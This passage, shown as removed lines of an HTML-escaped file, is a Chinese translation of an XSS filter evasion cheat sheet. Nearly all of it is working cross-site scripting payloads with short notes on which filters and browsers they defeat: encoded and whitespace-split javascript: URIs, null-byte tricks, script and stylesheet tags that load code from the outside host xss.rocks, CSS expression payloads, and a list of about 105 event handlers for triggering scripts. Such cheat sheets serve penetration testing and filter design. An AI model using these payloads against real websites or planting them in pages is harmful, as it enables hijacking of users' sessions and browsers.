-&lt;h2 id=&quot;不带分号的十六进制html字符实体编码&quot;&gt;不带分号的十六进制HTML字符实体编码&lt;/h2&gt;
-
-&lt;p&gt;这是有效绕过例如$tmp_string =~ s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此）&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;内嵌tab&quot;&gt;内嵌TAB&lt;/h2&gt;
-
-&lt;p&gt;使用TAB来分开XSS攻击代码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;内嵌编码后tab&quot;&gt;内嵌编码后TAB&lt;/h2&gt;
-
-&lt;p&gt;使用编码后的TAB来分开XSS攻击代码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x09;ascript:alert('XSS');&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;内嵌换行分隔xss攻击代码&quot;&gt;内嵌换行分隔XSS攻击代码&lt;/h2&gt;
-
-&lt;p&gt;一些网站声称09到13（十进制）的HTML实体字符都可以实现这种攻击，这是不正确的。只有09（TAB），10（换行）和13（回车）有效。查看ASCII字符表获取更多细节。下面几个XSS示例介绍了这些向量&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0A;ascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;内嵌回车分隔xss攻击代码&quot;&gt;内嵌回车分隔XSS攻击代码&lt;/h2&gt;
-
-&lt;p&gt;注意：上面使用了比实际需要长的字符串是因为0可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有2到3位字符。实际规则是1至7位字符&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0D;ascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用空字符分隔javascript指令&quot;&gt;使用空字符分隔JavaScript指令&lt;/h2&gt;
-
-&lt;p&gt;空字符同样可以作为XSS攻击向量，但和上面有所区别，你需要使用一些例如Burp工具或在URL字符串里使用%00，亦或你想使用VIM编写自己的注入工具（^V^@会生成空字符），还可以通过程序生成它到一个文本文件。老版本的Opera浏览器（例如Windows版的7.11）还会受另一个字符173（软连字符）的影响。但是空字符%00更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;perl -e 'print &quot;&amp;lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&amp;gt;&quot;;' &amp;gt; out
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;利用img标签中javascript指令前的空格和元字符&quot;&gt;利用IMG标签中JavaScript指令前的空格和元字符&lt;/h2&gt;
-
-&lt;p&gt;如果过滤器不计算”javascript:”前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和”javascript:”字样间不能有任何字符。实际情况是你可以插入任何十进制的1至32号字符&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot; &amp;amp;#14;  javascript:alert('XSS');&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;利用非字母非数字字符&quot;&gt;利用非字母非数字字符&lt;/h2&gt;
-
-&lt;p&gt;FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如”&amp;lt;SCRIPT\s” != “&amp;lt;SCRIPT/XSS\s”:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;基于上面的原理，可以使用模糊测试进行扩展。Gecko渲染引擎允许任何字符包括字母，数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Yair Amit让我注意到了IE和Gecko渲染引擎有一点不同行为，在于是否在HTML标签和参数之间允许一个不含空格的斜杠。这会非常有用如果系统不允许空格的时候&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;额外的尖括号&quot;&gt;额外的尖括号&lt;/h2&gt;
-
-&lt;p&gt;这个XSS攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如Boyer-Moore算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现JavaScript错误&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;未闭合的script标签&quot;&gt;未闭合的script标签&lt;/h2&gt;
-
-&lt;p&gt;在Firefox和Netscape  8.1的Gecko渲染引擎下你不是必须构造类似“&amp;gt;&amp;lt;/SCRIPT&amp;gt;”的跨站脚本攻击向量。Firefox假定闭合HTML标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响Firefox的下一个问题，这不需要在后面有额外的HTML标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后HTML会什么样子结束:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js?&amp;lt; B &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;script标签中的协议解析&quot;&gt;script标签中的协议解析&lt;/h2&gt;
-
-&lt;p&gt;这个特定的变体是由Łukasz  Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了&amp;lt;/SCRIPT&amp;gt;标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=//xss.rocks/.j&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;只含左尖括号的htmljavascript-xss向量&quot;&gt;只含左尖括号的HTML/JavaScript XSS向量&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&amp;gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:/((\%3D)&lt;/td&gt;
-      &lt;td&gt;(=))[^\n]*((\%3C)&lt;/td&gt;
-      &lt;td&gt;&amp;lt;)[^\n]+((\%3E)&lt;/td&gt;
-      &lt;td&gt;&amp;gt;)/因为不需要”&amp;gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&amp;lt;IFRAME标签替代&amp;lt;IMG标签也是非常有效的&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS')&quot; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;多个左尖括号&quot;&gt;多个左尖括号&lt;/h2&gt;
-
-&lt;p&gt;使用一个左尖括号替代右尖括号作为标签结尾的攻击向量会在不同浏览器的Gecko渲染引擎下有不同表现。没有左尖括号时，在Firefox中生效，而在Netscape中无效。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;iframe src=http://xss.rocks/scriptlet.html &amp;lt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;javascript双重转义&quot;&gt;JavaScript双重转义&lt;/h2&gt;
-
-&lt;p&gt;当应用将一些用户输入输出到例如：&lt;script&gt;var  a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/script&gt;的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到&lt;script&gt;vara=&quot;\\&quot;;alert('XSS');//&quot;;&lt;/script&gt;，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\&quot;;alert('XSS');//
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;另一种情况是，如果内嵌数据进行了正确的JSON或JavaScript转义，但没有HTML编码，那可以结束原有脚本块并开始你自己的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert('XSS');&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;闭合title标签&quot;&gt;闭合title标签&lt;/h2&gt;
-
-&lt;p&gt;这是一个简单的闭合&lt;TITLE&gt;标签的XSS攻击向量，可以包含恶意的跨站脚本攻击&lt;/TITLE&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;input-image&quot;&gt;INPUT image&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;body-image&quot;&gt;BODY image&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;img-dynsrc&quot;&gt;IMG Dynsrc&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;img-lowsrc&quot;&gt;IMG lowsrc&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;list-style-image&quot;&gt;List-style-image&lt;/h2&gt;
-
-&lt;p&gt;处理嵌入的图片列表是很麻烦的问题。由于JavaScript指令的原因只能在IE渲染引擎下有效。不是一个特别有用的跨站脚本攻击向量:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS&amp;lt;/br&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;图片中引用vbscript&quot;&gt;图片中引用VBscript&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;livescript-仅限旧版本netscape&quot;&gt;Livescript (仅限旧版本Netscape)&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;livescript:[code]&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;svg对象标签&quot;&gt;SVG对象标签&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;svg/onload=alert('XSS')&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;ecmascript-6&quot;&gt;ECMAScript 6&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Set.constructor`alert\x28document.domain\x29``` 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;body标签&quot;&gt;BODY标签&lt;/h2&gt;
-
-&lt;p&gt;这个方法不需要使用任何例如”javascript:”或”&amp;lt;SCRIPT…“语句来完成XSS攻击。Dan Crowley特别提醒你可以在等号前加入一个空格(“onload=” != “onload =”):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY ONLOAD=alert('XSS')&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;事件处理程序&quot;&gt;事件处理程序&lt;/h2&gt;
-
-&lt;p&gt;在XSS攻击中可使用以下事件&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;
-
-    1.    FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)
-
-    2.    onAbort() (当用户中止加载图片时)
-
-    3.    onActivate() (当对象激活时)
-
-    4.    onAfterPrint() (用户打印或进行打印预览后触发)
-
-    5.    onAfterUpdate() (从数据源对象更新数据后由数据对象触发)
-
-    6.    onBeforeActivate() (在对象设置为激活元素前触发)
-
-    7.    onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发)
-
-    8.    onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)
-
-    9.    onBeforeDeactivate() (在当前对象的激活元素变化前触发)
-
-    10.  onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)
-
-    11.  onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发)
-
-    12.  onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数).
-
-    13.  onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)
-
-    14.  onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)
-
-    15.  onBegin() (当元素周期开始时由onbegin 事件立即触发)
-
-    16.  onBlur() (另一个窗口弹出当前窗口失去焦点时触发)
-
-    17.  onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)
-
-    18.  onCellChange() (当数据提供者的数据变化时触发)
-
-    19.  onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)
-
-    20.  onClick() (表单中点击触发)
-
-    21.  onContextMenu() (用户需要在攻击区域点击右键)
-
-    22.  onControlSelect() (当用户在一个对象上创建控件选中区时触发)
-
-    23.  onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发)
-
-    24.  onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发)
-
-    25.  onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)
-
-    26.  onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)
-
-    27.  onDataSetComplete() (数据源对象中所有数据可用时触发)
-
-    28.  onDblClick() (用户双击一个表单元素或链接)
-
-    29.  onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)
-
-    30.  onDrag() (在元素正在拖动时触发)
-
-    31.  onDragEnd() (当用户完成元素的拖动时触发)
-
-    32.  onDragLeave() (用户在拖动元素离开放置目标时触发)
-
-    33.  onDragEnter() (用户将对象拖拽到合法拖曳目标)
-
-    34.  onDragOver() (用户将对象拖拽划过合法拖曳目标)
-
-    35.  onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)
-
-    36.  onDragStart() (当用户开始拖动元素时触发)
-
-    37.  onDrop() (当拖动元素放置在目标区域时触发)
-
-    38.  onEnded() (在视频/音频（audio/video）播放结束时触发)
-
-    39.  onError() (在加载文档或图像时发生错误)
-
-    40.  onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)
-
-    41.  onFilterChange() (当滤镜完成状态变更时触发)
-
-    42.  onFinish() (当marquee完成滚动时攻击者可以执行攻击)
-
-    43.  onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)
-
-    44.  onFocusIn() (当元素将要被设置为焦点之前触发)
-
-    45.  onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)
-
-    46.  onHashChange() (当锚部分发生变化时触发攻击代码)
-
-    47.  onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)
-
-    48.  onInput() (在 &amp;lt;input&amp;gt; 或 &amp;lt;textarea&amp;gt; 元素的值发生改变时触发)
-
-    49.  onKeyDown() (用户按下一个键的时候触发)
-
-    50.  onKeyPress() (在键盘按键被按下并释放一个键时触发)
-
-    51.  onKeyUp() (用户释放一个键时触发)
-
-    52.  onLayoutComplete() (用户进行完打印或打印预览时触发)
-
-    53.  onLoad() (攻击者在窗口加载后触发攻击代码)
-
-    54.  onLoseCapture() (可以由releaseCapture()方法触发)
-
-    55.  onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)
-
-    56.  onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)
-
-    57.  onMessage() (当页面收到一个信息时触发事件)
-
-    58.  onMouseDown() (攻击者需要让用户点击一个图片触发事件)
-
-    59.  onMouseEnter() (光标移动到一个对象或区域时触发)
-
-    60.  onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)
-
-    61.  onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)
-
-    62.  onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)
-
-    63.  onMouseOver() (光标移动到一个对象或区域)
-
-    64.  onMouseUp() (攻击者需要让用户点击一个图片)
-
-    65.  onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)
-
-    66.  onMove() (用户或攻击者移动页面时触发)
-
-    67.  onMoveEnd() (用户或攻击者移动页面结束时触发)
-
-    68.  onMoveStart() (用户或攻击者开始移动页面时触发)
-
-    69.  onOffline() (当浏览器从在线模式切换到离线模式时触发)
-
-    70.  onOnline() (当浏览器从离线模式切换到在线模式时触发)
-
-    71.  onOutOfSync() (当元素与当前时间线失去同步时触发)
-
-    72.  onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发)
-
-    73.  onPause() (在视频或音频暂停时触发)
-
-    74.  onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)
-
-    75.  onProgress() (攻击者可以在一个FLASH加载时触发事件)
-
-    76.  onPropertyChange() (用户或攻击者需要改变元素属性时触发)
-
-    77.  onReadyStateChange() (每次 readyState 属性变化时被自动调用)
-
-    78.  onRedo() (用户返回上一页面时触发)
-
-    79.  onRepeat() (事件在播放完重复播放时触发)
-
-    80.  onReset() (用户或攻击者重置表单时触发)
-
-    81.  onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&amp;lt;SCRIPT&amp;gt;self.resizeTo(500,400);&amp;lt;/SCRIPT&amp;gt;)
-
-    82.  onResizeEnd() (用户完成改变窗体大小时触发)
-
-    83.  onResizeStart() (用户开始改变窗体大小时触发)
-
-    84.  onResume() (当元素继续播放时触发)
-
-    85.  onReverse() (当元素回放时触发)
-
-    86.  onRowsEnter() (用户或攻击者需要改变数据源中的一行)
-
-    87.  onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)
-
-    88.  onRowDelete() (用户或攻击者需要删除数据源中的一行)
-
-    89.  onRowInserted() (user or attacker would needto insert a row in a data source)
-
-    90.  onScroll() (用户需要滚动或攻击者使用scrollBy()函数)
-
-    91.  onSeek() (当用户在元素上执行查找操作时触发)
-
-    92.  onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)
-
-    93.  onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)
-
-    94.  onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)
-
-    95.  onStart() (在marquee 对象开始循环时触发)
-
-    96.  onStop() (当用户按下停止按钮或离开页面时触发)
-
-    97.  onStorage() (当Web Storage更新时触发)
-
-    98.  onSyncRestored() (当元素与它的时间线恢复同步时触发)
-
-    99.  onSubmit() (需要用户或攻击者提交表单)
-
-    100.onTimeError() (用户或攻击者设置时间属性出现错误时触发)
-
-    101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)
-
-    102.onUndo() (用户返回上一浏览记录页面时触发)
-
-    103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)
-
-    104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)
-
-    105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;bgsound&quot;&gt;BGSOUND&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;-javascript包含&quot;&gt;&amp;amp; JavaScript包含&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BR SIZE=&quot;&amp;amp;{alert('XSS')}&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;样式表&quot;&gt;样式表&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;远程样式表&quot;&gt;远程样式表&lt;/h2&gt;
-
-&lt;p&gt;利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效, 也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://xss.rocks/xss.css&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;远程样式表2&quot;&gt;远程样式表2&lt;/h2&gt;
-
-&lt;p&gt;这个和上面一样有效，不过使用了&lt;style&gt;标签替代&lt;link /&gt;标签.  这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的&lt;/style&gt;标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@import'http://xss.rocks/xss.css';&amp;lt;/STYLE&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;远程样式表3&quot;&gt;远程样式表3&lt;/h2&gt;
-
-&lt;p&gt;这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意.  根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera).  这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: &lt;a href=&quot;http://xss.rocks/xss.css&quot;&gt;http://xss.rocks/xss.css&lt;/a&gt;; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&amp;lt;http://xss.rocks/xss.css&amp;gt;; REL=stylesheet&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;远程样式表4&quot;&gt;远程样式表4&lt;/h2&gt;
-
-&lt;p&gt;这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&amp;lt;/STYLE&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含有分隔javascript的style标签&quot;&gt;含有分隔JavaScript的STYLE标签&lt;/h2&gt;
-
-&lt;p&gt;这个XSS会在IE中造成无限循环:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&amp;lt;/STYLE&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;style属性中使用注释分隔表达式&quot;&gt;STYLE属性中使用注释分隔表达式&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含表达式的img-style&quot;&gt;含表达式的IMG STYLE&lt;/h2&gt;
-
-&lt;p&gt;这是一个将上面XSS攻击向量混合的方法，但确实展示了STYLE标签可以用相当复杂的方式分隔，和上面一样，也会让IE进入死循环:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;exp/*&amp;lt;A STYLE='no\xss:noxss(&quot;*//*&quot;);
-
-xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;style标签仅旧版本netscape可用&quot;&gt;STYLE标签（仅旧版本Netscape可用）&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE TYPE=&quot;text/javascript&quot;&amp;gt;alert('XSS');&amp;lt;/STYLE&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用背景图像的style标签&quot;&gt;使用背景图像的STYLE标签&lt;/h2&gt;
-
